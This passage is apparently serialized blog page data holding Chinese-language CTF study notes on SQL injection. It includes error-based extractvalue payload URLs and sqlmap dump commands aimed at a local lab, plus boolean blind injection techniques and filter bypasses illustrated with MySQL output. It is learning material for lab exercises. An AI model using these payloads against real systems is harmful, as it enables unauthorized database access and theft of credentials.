829012,114514,234231,flag{sql_inj3ct10n}\n\n\n# 使用extractvalue()函数完成例题\n\n我们用extractvalue函数拼接出以下请求\n\nhttp://127.0.0.1:8000/?student_id=1%27 and extractvalue(1,concat(0x0a,(select group_concat(card_passwd)from teacher)))%23\n\n\n1\n\n\n得到了如下报错信息，发现报错信息太长了，部分内容不显示了\n\nxpath syntax error:'829012,114514,234231,fag{sql_1'\n\n\n1\n\n\n我们优化一下请求，从后20位开始截取\n\nhttp://127.0.0.1:8000/?student_id=1%27 and extractvalue(1,concat(0x0a,(select substr((select group_concat(card_passwd)from teacher),20))))%23\n\n\n1\n\n\n得到了如下报错信息，由此我们可以学到，如果长度不够，可以尝试截取，\n\nr:'234231,flag{sql_inj3ct10n}\n\n\n1\n\n\n\n# 使用sqlmap完成例题\n\n# 跑数据库\nsqlmap -u http://127.0.0.1:8000/\\?student id\\=2019122001 --dbs\n# 现在使用的数据库\nsqlmap -u http://127.0.0.1:8000/\\?student id\\=2019122001 --current-db\n# -d是指定库名 -tables是查所有表\nsqlmap -u http://127.0.0.1:8000/\\?student id\\=2019122001 --d college -tables\n# -t 是指定表名 --columns是所有列\nsqlmap -u http://127.0.0.1:8000/\\?student id\\=2019122001 --d college -t teacher --columns\n# --dump是将表中所有信息dump出来\nsqlmap -u http://127.0.0.1:8000/\\?student id\\=2019122001 --d college -t teacher --dump\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n",charsets:{cjk:!0},lastUpdated:"2024/12/15, 20:52:37",lastUpdatedTimestamp:1734267157e3},{title:"20241213CTF学习笔记10",frontmatter:{title:"20241213CTF学习笔记10",date:"2024-12-13T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-13-CTFLearn.html",relativePath:"views/numerology/2024-12-13-CTFLearn.md",key:"v-8ec5a804",path:"/views/numerology/2024-12-13-CTFLearn.html",headers:[{level:2,title:"布尔盲注-回显不同",slug:"布尔盲注-回显不同",normalizedTitle:"布尔盲注-回显不同",charIndex:43},{level:3,title:"布尔状态例如：",slug:"布尔状态例如",normalizedTitle:"布尔状态例如：",charIndex:58},{level:3,title:"初步认识盲注：",slug:"初步认识盲注",normalizedTitle:"初步认识盲注：",charIndex:71},{level:3,title:"盲注的两大基础问题",slug:"盲注的两大基础问题",normalizedTitle:"盲注的两大基础问题",charIndex:84},{level:3,title:"字符串的截取",slug:"字符串的截取",normalizedTitle:"字符串的截取",charIndex:99},{level:3,title:"不是比较字符的解决方案---Ascii码",slug:"不是比较字符的解决方案-ascii码",normalizedTitle:"不是比较字符的解决方案---ascii码",charIndex:111}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第28天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">🔗传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"布尔盲注-回显不同 布尔状态例如： 初步认识盲注： 盲注的两大基础问题 字符串的截取 不是比较字符的解决方案---Ascii码",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第28天\n\n\n\n * 布尔盲注-回显不同\n   * 布尔状态例如：\n   * 初步认识盲注：\n   * 盲注的两大基础问题\n   * 字符串的截取\n   * 不是比较字符的解决方案---Ascii码\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第11章：布尔盲注1\n\n\n# 布尔盲注-回显不同\n\n\n# 布尔状态例如：\n\n 1. 回显不同（比如能查到内容时显示内容，查不到时不显示内容、长度）\n 2. HTTP响应状态码不同（200成功、500、301重定向）\n 3. HTTP响应头变化（比如登录成功，可能会带location的请求头进行重定向，或者加上一个新的cookie，如果失败就没有以上这些）\n 4. 基于错误的布尔注入（MySQL是否报错）\n\n我们从浏览器看到的各种内容的变化、响应头的变化、状态码的变化实际反映的是SQL语句查询的成功与否的布尔状态。\n\n\n# 初步认识盲注：\n\n# and 与运算 一假全假 这个语句的查询成功成功完全决定于and后边1=1和1=2\nselect * from users where id='1' and 1=1\nselect * from users where id='1' and 1=2\n\n# 同理我们可以换成别的条件 查首字母是不是a、b、c等\nselect * from users where id ='1' and substr((select database()),1,1)='a'\nselect * from users where id = '1' and substr((select database()),1,1)='c'\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n光有首字母还不够，我们可以修改substr的参数，比如\n\nselect * from users where id = '1' and substr((select database()),2,1)='a'\n\n\n1\n\n\n以此类推。。。\n\n认识盲注之后，我们可以仔细观察这个条件\n\nsubstr((select database()),2,1)='a'\n\n\n1\n\n\n由此，我们可以引申出来盲注的两个基本点、两大基本问题：\n\n\n# 盲注的两大基础问题\n\n 1. ✅字符串的截取\n 2. ✅比较\n\n举个简单的例子，比如目标库名是ctfgame，我们截取以后再进行比较，总共7个字母，每个位置有62种字符，最差的情况也只需要7*62次就会得出结果。\n\n而如果我们不进行截取，直接对库名进行爆破，就远远不止7*62种可能，而是“62的七次方”个结果。\n\n\n# 字符串的截取\n\n 1. substr (substring是另一种写法)\n    \n    在数据库中，最最最常用的是substr，而substr有两种参数写法，一种是substr(str,pos)这种方式只能从某一位开始截取，一直截取到最后，这个就不够灵活，而另一种参数方法是substr(str,pos,len)\n    \n    * str：这是原始的字符串，它可以是一个列名（表示从表中的某一列获取字符串），也可以是一个字符串常量。例如，在查询语句SELECT SUBSTR('abcdef', 3);中，'abcdef'就是原始字符串str。\n    * pos：这个参数指定了开始提取子字符串的位置。需要注意的是，在 MySQL 中，字符串的位置索引是从 1 开始的，而不是 0。例如，在SUBSTR('abcdef', 3)中，pos = 3，表示从字符c开始提取，最终结果为cdef。\n    * len：这个参数指定了长度，比如SUBSTR('abcdef', 3, 1)中，len=3，表示从c开始截取，截取1位，最终结果\n    * 如果我们被过滤了逗号怎么办？我们可以用如下办法SELECT SUBSTR('2024-12-14', 6, 5);与SELECT SUBSTR('2024-12-14' FROM 6 FOR 5)\n\n 2. mid()\n    \n    SQL MID()函数用于得到一个字符串的一部分，只有MySQL支持，不被 SQL Server 和 Oracle支持，而在SQL Server和 Oracle中可以用SQL SUBSTRING函数或者SQL SUBSTR函数作为替代。有substr首先substr，没有再用mid替代\n    \n    mid和substr基本相同，不同点在于以下区别\n    \n    * substr中参数是可选的，但mid必须是3个参数\n    * substr支持SUBSTRING(str FROM pos FOR len)或者SUBSTRING(str FROM pos)，举例如上一条\n\n 3. right()\n    \n    从右边开始截取，如right('abcde',1)就是截取到一个e，此时就不是精确的截取某一位的东西了，但我们还可以利用这个函数达到我们的目的。我们用以下步骤实现\n    \n    1. right('abcdef',1)='a'、right('abcdef',1)='b'、right('abcdef',1)='c'依次类推，直到找到f\n    2. 然后我们截两位right('abcdef',2)='af'、right('abcdef',2)='bf'、right('abcdef',2)='cf'依次类推，最终找到是ef\n    3. 接下来递归往前推，每次多截1位，带着之前已经截取好并比较通过过的内容去继续比较\n\n> 其实我们不推荐用直接比较字符的方法，因为如果目标的flag中有特殊字符单引号'，在使用这个方法的时候，就会产生如下语句，单引号导致了出现了语法错误。\n> \n> right(select flag from flag,3) = ''def'\n> \n> \n> 1\n\n\n# 不是比较字符的解决方案---Ascii码\n\nascii码在使用时，一定要注意的一点是：97对应的a是首字符，ascii函数会返回首字符的ascii码值\n\nmysql> select ascii('abc');\n+--------------+\n| ascii('abc') |\n+--------------+\n|           97 |\n+--------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n接下来我们看如下情况：\n\nmysql> select right('abcdef',1);\n+-------------------+\n| right('abcdef',1) |\n+-------------------+\n| f                 |\n+-------------------+\n1 row in set (0.00 sec)\n\nmysql> select right('abcdef',2);\n+-------------------+\n| right('abcdef',2) |\n+-------------------+\n| ef                |\n+-------------------+\n1 row in set (0.00 sec)\n\nmysql> select right('abcdef',3);\n+-------------------+\n| right('abcdef',3) |\n+-------------------+\n| def               |\n+-------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n由刚才的查询结果可以得知，我们的首字母是一直在变的，我们将他套进ascii函数里去，得到如下结果：\n\nmysql> select ascii(right('abcdef',1));\n+--------------------------+\n| ascii(right('abcdef',1)) |\n+--------------------------+\n|                      102 |\n+--------------------------+\n1 row in set (0.00 sec)\n\nmysql> select ascii(right('abcdef',2));\n+--------------------------+\n| ascii(right('abcdef',2)) |\n+--------------------------+\n|                      101 |\n+--------------------------+\n1 row in set (0.00 sec)\n\nmysql> select ascii(right('abcdef',3));\n+--------------------------+\n| ascii(right('abcdef',3)) |\n+--------------------------+\n|                      100 |\n+--------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第28天\n\n\n\n * 布尔盲注-回显不同\n   * 布尔状态例如：\n   * 初步认识盲注：\n   * 盲注的两大基础问题\n   * 字符串的截取\n   * 不是比较字符的解决方案---ascii码\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第11章：布尔盲注1\n\n\n# 布尔盲注-回显不同\n\n\n# 布尔状态例如：\n\n 1. 回显不同（比如能查到内容时显示内容，查不到时不显示内容、长度）\n 2. http响应状态码不同（200成功、500、301重定向）\n 3. http响应头变化（比如登录成功，可能会带location的请求头进行重定向，或者加上一个新的cookie，如果失败就没有以上这些）\n 4. 基于错误的布尔注入（mysql是否报错）\n\n我们从浏览器看到的各种内容的变化、响应头的变化、状态码的变化实际反映的是sql语句查询的成功与否的布尔状态。\n\n\n# 初步认识盲注：\n\n# and 与运算 一假全假 这个语句的查询成功成功完全决定于and后边1=1和1=2\nselect * from users where id='1' and 1=1\nselect * from users where id='1' and 1=2\n\n# 同理我们可以换成别的条件 查首字母是不是a、b、c等\nselect * from users where id ='1' and substr((select database()),1,1)='a'\nselect * from users where id = '1' and substr((select database()),1,1)='c'\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n光有首字母还不够，我们可以修改substr的参数，比如\n\nselect * from users where id = '1' and substr((select database()),2,1)='a'\n\n\n1\n\n\n以此类推。。。\n\n认识盲注之后，我们可以仔细观察这个条件\n\nsubstr((select database()),2,1)='a'\n\n\n1\n\n\n由此，我们可以引申出来盲注的两个基本点、两大基本问题：\n\n\n# 盲注的两大基础问题\n\n 1. ✅字符串的截取\n 2. ✅比较\n\n举个简单的例子，比如目标库名是ctfgame，我们截取以后再进行比较，总共7个字母，每个位置有62种字符，最差的情况也只需要7*62次就会得出结果。\n\n而如果我们不进行截取，直接对库名进行爆破，就远远不止7*62种可能，而是“62的七次方”个结果。\n\n\n# 字符串的截取\n\n 1. substr (substring是另一种写法)\n    \n    在数据库中，最最最常用的是substr，而substr有两种参数写法，一种是substr(str,pos)这种方式只能从某一位开始截取，一直截取到最后，这个就不够灵活，而另一种参数方法是substr(str,pos,len)\n    \n    * str：这是原始的字符串，它可以是一个列名（表示从表中的某一列获取字符串），也可以是一个字符串常量。例如，在查询语句select substr('abcdef', 3);中，'abcdef'就是原始字符串str。\n    * pos：这个参数指定了开始提取子字符串的位置。需要注意的是，在 mysql 中，字符串的位置索引是从 1 开始的，而不是 0。例如，在substr('abcdef', 3)中，pos = 3，表示从字符c开始提取，最终结果为cdef。\n    * len：这个参数指定了长度，比如substr('abcdef', 3, 1)中，len=3，表示从c开始截取，截取1位，最终结果\n    * 如果我们被过滤了逗号怎么办？我们可以用如下办法select substr('2024-12-14', 6, 5);与select substr('2024-12-14' from 6 for 5)\n\n 2. mid()\n    \n    sql mid()函数用于得到一个字符串的一部分，只有mysql支持，不被 sql server 和 oracle支持，而在sql server和 oracle中可以用sql substring函数或者sql substr函数作为替代。有substr首先substr，没有再用mid替代\n    \n    mid和substr基本相同，不同点在于以下区别\n    \n    * substr中参数是可选的，但mid必须是3个参数\n    * substr支持substring(str from pos for len)或者substring(str from pos)，举例如上一条\n\n 3. right()\n    \n    从右边开始截取，如right('abcde',1)就是截取到一个e，此时就不是精确的截取某一位的东西了，但我们还可以利用这个函数达到我们的目的。我们用以下步骤实现\n    \n    1. right('abcdef',1)='a'、right('abcdef',1)='b'、right('abcdef',1)='c'依次类推，直到找到f\n    2. 然后我们截两位right('abcdef',2)='af'、right('abcdef',2)='bf'、right('abcdef',2)='cf'依次类推，最终找到是ef\n    3. 接下来递归往前推，每次多截1位，带着之前已经截取好并比较通过过的内容去继续比较\n\n> 其实我们不推荐用直接比较字符的方法，因为如果目标的flag中有特殊字符单引号'，在使用这个方法的时候，就会产生如下语句，单引号导致了出现了语法错误。\n> \n> right(select flag from flag,3) = ''def'\n> \n> \n> 1\n\n\n# 不是比较字符的解决方案---ascii码\n\nascii码在使用时，一定要注意的一点是：97对应的a是首字符，ascii函数会返回首字符的ascii码值\n\nmysql> select ascii('abc');\n+--------------+\n| ascii('abc') |\n+--------------+\n|           97 |\n+--------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n接下来我们看如下情况：\n\nmysql> select right('abcdef',1);\n+-------------------+\n| right('abcdef',1) |\n+-------------------+\n| f                 |\n+-------------------+\n1 row in set (0.00 sec)\n\nmysql> select right('abcdef',2);\n+-------------------+\n| right('abcdef',2) |\n+-------------------+\n| ef                |\n+-------------------+\n1 row in set (0.00 sec)\n\nmysql> select right('abcdef',3);\n+-------------------+\n| right('abcdef',3) |\n+-------------------+\n| def               |\n+-------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n由刚才的查询结果可以得知，我们的首字母是一直在变的，我们将他套进ascii函数里去，得到如下结果：\n\nmysql> select ascii(right('abcdef',1));\n+--------------------------+\n| ascii(right('abcdef',1)) |\n+--------------------------+\n|                      102 |\n+--------------------------+\n1 row in set (0.00 sec)\n\nmysql> select ascii(right('abcdef',2));\n+--------------------------+\n| ascii(right('abcdef',2)) |\n+--------------------------+\n|                      101 |\n+--------------------------+\n1 row in set (0.00 sec)\n\nmysql> select ascii(right('abcdef',3));\n+--------------------------+\n| ascii(right('abcdef',3)) |\n+--------------------------+\n|                      100 |\n+--------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n",charsets:{cjk:!0},lastUpdated:"2024/12/15, 20:52:37",lastUpdatedTimestamp:1734267157e3},{title:"20241214CTF学习笔记11",frontmatter:{title:"20241214CTF学习笔记11",date:"2024-12-14T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-14-CTFLearn.html",relativePath:"views/numerology/2024-12-14-CTFLearn.md",key:"v-3bcceb80",path:"/views/numerology/2024-12-14-CTFLearn.html",headers:[{level:2,title:"书接上回",slug:"书接上回",normalizedTitle:"书接上回",charIndex:43},{level:3,title:"如果ascii()函数被过滤了怎么办？",slug:"如果ascii-函数被过滤了怎么办",normalizedTitle:"如果ascii()函数被过滤了怎么办？",charIndex:53},{level:2,title:"left()函数",slug:"left-函数",normalizedTitle:"left()函数",charIndex:76},{level:2,title:"trim()函数",slug:"trim-函数",normalizedTitle:"trim()函数",charIndex:88},{level:3,title:"定义：",slug:"定义",normalizedTitle:"定义：",charIndex:102},{level:3,title:"同类型的函数：",slug:"同类型的函数",normalizedTitle:"同类型的函数：",charIndex:111},{level:3,title:"其他用法：",slug:"其他用法",normalizedTitle:"其他用法：",charIndex:124},{level:2,title:"比较",slug:"比较",normalizedTitle:"比较",charIndex:133},{level:3,title:"等于",slug:"等于",normalizedTitle:"等于",charIndex:141},{level:3,title:"大于 小于",slug:"大于-小于",normalizedTitle:"大于 小于",charIndex:149},{level:3,title:"Like模糊匹配",slug:"like模糊匹配",normalizedTitle:"like模糊匹配",charIndex:160},{level:3,title:"正则表达式 regexp/rlike",slug:"正则表达式-regexp-rlike",normalizedTitle:"正则表达式 regexp/rlike",charIndex:174},{level:3,title:"范围比较关键字Between",slug:"范围比较关键字between",normalizedTitle:"范围比较关键字between",charIndex:198},{level:3,title:"IN 关键字",slug:"in-关键字",normalizedTitle:"in 关键字",charIndex:218},{level:3,title:"And逻辑与运算符",slug:"and逻辑与运算符",normalizedTitle:"and逻辑与运算符",charIndex:230},{level:3,title:"or或运算",slug:"or或运算",normalizedTitle:"or或运算",charIndex:245},{level:3,title:"异或",slug:"异或",normalizedTitle:"异或",charIndex:256},{level:3,title:"拓展",slug:"拓展",normalizedTitle:"拓展",charIndex:264},{level:4,title:"异或定义：",slug:"异或定义",normalizedTitle:"异或定义：",charIndex:11069},{level:4,title:"分析`SELECT 1^1^1;`的运算过程",slug:"分析select-1-1-1-的运算过程",normalizedTitle:"分析<code>select 1^1^1;</code>的运算过程",charIndex:null}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第28天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">🔗传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"书接上回 如果ascii()函数被过滤了怎么办？ left()函数 trim()函数 定义： 同类型的函数： 其他用法： 比较 等于 大于 小于 Like模糊匹配 正则表达式 regexp/rlike 范围比较关键字Between IN 关键字 And逻辑与运算符 or或运算 异或 拓展 异或定义： 分析`SELECT 1^1^1;`的运算过程",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第28天\n\n\n\n * 书接上回\n   * 如果ascii()函数被过滤了怎么办？\n * left()函数\n * trim()函数\n   * 定义：\n   * 同类型的函数：\n   * 其他用法：\n * 比较\n   * 等于\n   * 大于 小于\n   * Like模糊匹配\n   * 正则表达式 regexp/rlike\n   * 范围比较关键字Between\n   * IN 关键字\n   * And逻辑与运算符\n   * or或运算\n   * 异或\n   * 拓展\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第12章：布尔盲注2\n\n\n# 书接上回\n\n我们使用ascii()函数的好处是：\n\n 1. 可以免除乱七八糟的符号的干扰\n 2. 让right等函数本来不是精确的截取变成了精确的截取\n 3. 字符转换为数字后，能进行大于号、小于号的比较\n\nmysql> select ascii(right('abcdef',4))>1;\n+----------------------------+\n| ascii(right('abcdef',4))>1 |\n+----------------------------+\n|                          1 |\n+----------------------------+\n1 row in set (0.00 sec)\n\nmysql> select ascii(right('abcdef',4))>100;\n+------------------------------+\n| ascii(right('abcdef',4))>100 |\n+------------------------------+\n|                            0 |\n+------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select ascii(right('abcdef',4))>50;\n+-----------------------------+\n| ascii(right('abcdef',4))>50 |\n+-----------------------------+\n|                           1 |\n+-----------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n我们可以用大于、小于做比较，用二分查找来找到目标的字母。\n\n如果我们用字符来比较的话，逐个比较比较浪费时间，转为ascii后用二分查找要大大节省时间和流量\n\n\n# 如果ascii()函数被过滤了怎么办？\n\n如果ascii()函数被过滤了，我们可以使用ascii的同名函数ord()\n\n\n# left()函数\n\nleft()函数的使用方法基本和right()函数相同，left(str,len)，和right()不同的点在于是从左截取，导致首字母一直是第一个字母不变，不能用ascii()的函数，但有天才想出来可以用resverse()函数，将left的结果倒过来，倒过来以后就能用ascii码了。\n\nmysql> select left('abc',1);\n+---------------+\n| left('abc',1) |\n+---------------+\n| a             |\n+---------------+\n1 row in set (0.00 sec)\n\nmysql> select left('abc',2);\n+---------------+\n| left('abc',2) |\n+---------------+\n| ab            |\n+---------------+\n1 row in set (0.00 sec)\n\nmysql> select left('abc',3);\n+---------------+\n| left('abc',3) |\n+---------------+\n| abc           |\n+---------------+\n1 row in set (0.00 sec)\n\nmysql> select reverse(left('abc',3));\n+------------------------+\n| reverse(left('abc',3)) |\n+------------------------+\n| cba                    |\n+------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# trim()函数\n\n\n# 定义：\n\ntrim()函数：过滤指定的字符串，最常见的用途是移除字首或字尾的空白。\n\n\n# 同类型的函数：\n\n在MySQL中：TRIM()、LTRIM()、RTRIM()\n\n * TRIM()删除前后空格\n * LTRIM()删除字符串结尾空格\n * RTRIM()删除字符串起始空格\n\n\n# 其他用法：\n\nBOTH前后都移除，LEADING移除前面的，TRAILING移除后边的。\n\ntrim([BOTH/LEADING/TRAILING] 目标字符串 FROM 源字符串)\n\n\n1\n\n\n举例：\n\nmysql> select trim(leading 'a' from 'abcd');\n+-------------------------------+\n| trim(leading 'a' from 'abcd') |\n+-------------------------------+\n| bcd                           |\n+-------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select trim(leading 'b' from 'abcd');\n+-------------------------------+\n| trim(leading 'b' from 'abcd') |\n+-------------------------------+\n| abcd                          |\n+-------------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n以上结果表明，如果用leading这种移除只能移除开头是指定字符的，此时我们可以加一些技巧，让他可以精确的截取（这个技巧简直是天才的想法）\n\n# I表示一个字符的意思，比如I=a，则I+1=b，I+2=c\n# 设I=x，I+1是y，字符串只有确定的一个字符是起始，所以对两个的trim leading进行比较\n# xy如果都不是起始，等于号左右两边都是abcd，比较后会返回1，如果xy中有一个是起始，这个比较就会返回0\ntrim(leading I from 'abcd') = trim(leading I+1 from 'abcd')\n\n# 循环执行上一步，抽象理解我们的结果锁定在了I和I+1这两者之间，我们对I+1和I+2再进行一次比较\n# 如果说I+1和I+2的trim相等了，说明首字符就是I，如果I+1和I+2不相等，说明首字符是I+1\ntrim(leading I+2 from 'abcd') = trim(leading I+1 from 'abcd')\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n类似的，我们用trim还有多种方法能做精确的截取，比如trim i和trim i+1比较长度，或者是和源字符串进行比较，所以刚才列举的方法并不是唯一的方法。\n\n\n# 比较\n\n\n# 等于\n\nselect substr(database(),1,1)='a'\n\n\n1\n\n\n\n# 大于 小于\n\nmysql> select 2>1;\n+-----+\n| 2>1 |\n+-----+\n|   1 |\n+-----+\n1 row in set (0.00 sec)\n\nmysql> select 'b'>'a';\n+---------+\n| 'b'>'a' |\n+---------+\n|       1 |\n+---------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n特别需要注意的是：在比较字符串的时候，看的只是首字符\n\nmysql> select 'b'>'abcdef';\n+--------------+\n| 'b'>'abcdef' |\n+--------------+\n|            1 |\n+--------------+\n1 row in set (0.00 sec)\n\nmysql> select 'b'>'cdef';\n+------------+\n| 'b'>'cdef' |\n+------------+\n|          0 |\n+------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# Like模糊匹配\n\n> 在 MySQL 中，LIKE是一个用于模糊匹配的关键字，主要用于在SELECT、UPDATE、DELETE等语句中对字符型数据进行模式匹配。它可以帮助你查找那些满足某种模糊条件的记录，例如查找所有以某个字符开头或者包含某个字符的字符串。使用百分号%来表示任意字符，使用下划线_表示单个字符。\n\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| base               |\n| sys                |\n| tale               |\n| test               |\n+--------------------+\n.. rows in set (0.01 sec)\n\nmysql> select database() like 't%';\n+----------------------+\n| database() like 't%' |\n+----------------------+\n|                    1 |\n+----------------------+\n1 row in set (0.00 sec)\n\nmysql> select database() like 'a%';\n+----------------------+\n| database() like 'a%' |\n+----------------------+\n|                    0 |\n+----------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n通过以上案例可以了解到一些特性，这样返回的结果是一个布尔值，只能表示有或没有\n\nmysql> select 1 like '1';\n+------------+\n| 1 like '1' |\n+------------+\n|          1 |\n+------------+\n1 row in set (0.00 sec)\n\nmysql> select 1 like 1;\n+----------+\n| 1 like 1 |\n+----------+\n|        1 |\n+----------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n🙋‍♂️通过以上案例可以看到，当使用LIKE操作符时，数字会被隐式地转换为字符类型，然后再进行模式匹配\n\n🙋‍♂️如果没有使用百分号%，LIKE子句与等于号=是一样的。\n\n\n# 正则表达式 regexp/rlike\n\n如果我们有个test的数据库，而我们执行以下语句，得到结果为真\n\nmysql> select database() regexp '^te';\n+-------------------------+\n| database() regexp '^te' |\n+-------------------------+\n|                       1 |\n+-------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n需要注意的是，regexp是不区分大小写的，需要大小写敏感的话需要加上binary关键字\n\nmysql> select binary database() rlike '^tes';\n+--------------------------------+\n| binary database() rlike '^tes' |\n+--------------------------------+\n|                              1 |\n+--------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select binary database() rlike '^Tes';\n+--------------------------------+\n| binary database() rlike '^Tes' |\n+--------------------------------+\n|                              0 |\n+--------------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 范围比较关键字Between\n\nexpr [NOT] BETWEEN bgin_expr AND end_expr;\n\n * between筛选的是expr>=begin_expr并且expr<=end_expr的数据，如果不存在则返回的是0；\n * not between筛选的是expr<begin_expr或者expr>endexpr的数据，如果不存在则返回的是0；\n * 如果expr返回的是NULL，则between返回的也是NULL；\n\nmysql> select 2 between 1 and 3;\n+-------------------+\n| 2 between 1 and 3 |\n+-------------------+\n|                 1 |\n+-------------------+\n1 row in set (0.00 sec)\n\nmysql> select 2 between 2 and 2;\n+-------------------+\n| 2 between 2 and 2 |\n+-------------------+\n|                 1 |\n+-------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n不建议用between 2 and 3，这样符合条件的有多个，因为是闭区间，完全可以限定死只能是between 2 and 2\n\n\n# IN 关键字\n\nin对大小写也不敏感，字符和数字都可以用in，同样我们也有not in\n\nmysql> select 'a' in('a','b','c');\n+---------------------+\n| 'a' in('a','b','c') |\n+---------------------+\n|                   1 |\n+---------------------+\n1 row in set (0.00 sec)\n\nmysql> select 1 in (1);\n+----------+\n| 1 in (1) |\n+----------+\n|        1 |\n+----------+\n1 row in set (0.00 sec)\n\nmysql> select 'a' in ('A');\n+--------------+\n| 'a' in ('A') |\n+--------------+\n|            1 |\n+--------------+\n1 row in set (0.00 sec)\n\nmysql> select binary 'a' in('A');\n+--------------------+\n| binary 'a' in('A') |\n+--------------------+\n|                  0 |\n+--------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# And逻辑与运算符\n\n * 1与任何字符and运算都是0\n * 1与任何非0数字and运算都是1\n\nmysql> select 1 and '0';\n+-----------+\n| 1 and '0' |\n+-----------+\n|         0 |\n+-----------+\n1 row in set (0.00 sec)\n\nmysql> select 1 and 0;\n+---------+\n| 1 and 0 |\n+---------+\n|       0 |\n+---------+\n1 row in set (0.00 sec)\n\nmysql> select 1 and ascii('a');\n+------------------+\n| 1 and ascii('a') |\n+------------------+\n|                1 |\n+------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n&&：这是逻辑与运算 和and一样\n\n&：这是按位与运算\n\nmysql> select 1 and ascii('a')-96;\n+---------------------+\n| 1 and ascii('a')-96 |\n+---------------------+\n|                   1 |\n+---------------------+\n1 row in set (0.00 sec)\n\nmysql> select 1 and ascii('a')-97;\n+---------------------+\n| 1 and ascii('a')-97 |\n+---------------------+\n|                   0 |\n+---------------------+\n1 row in set (0.00 sec)\n\nmysql> select 1 and ascii('a')-98;\n+---------------------+\n| 1 and ascii('a')-98 |\n+---------------------+\n|                   1 |\n+---------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n由以上案例我们可以在盲注中用and来判读， ascii('a')-97做了and判断后结果显示0，说明字符是chr(97)\n\n\n# or或运算\n\n * ||等价于or\n * |是按位或\n\nmysql> select 0 or ascii('a')-96;\n+--------------------+\n| 0 or ascii('a')-96 |\n+--------------------+\n|                  1 |\n+--------------------+\n1 row in set (0.00 sec)\n\nmysql> select 0 or ascii('a')-97;\n+--------------------+\n| 0 or ascii('a')-97 |\n+--------------------+\n|                  0 |\n+--------------------+\n1 row in set (0.00 sec)\n\nmysql> select 0 or 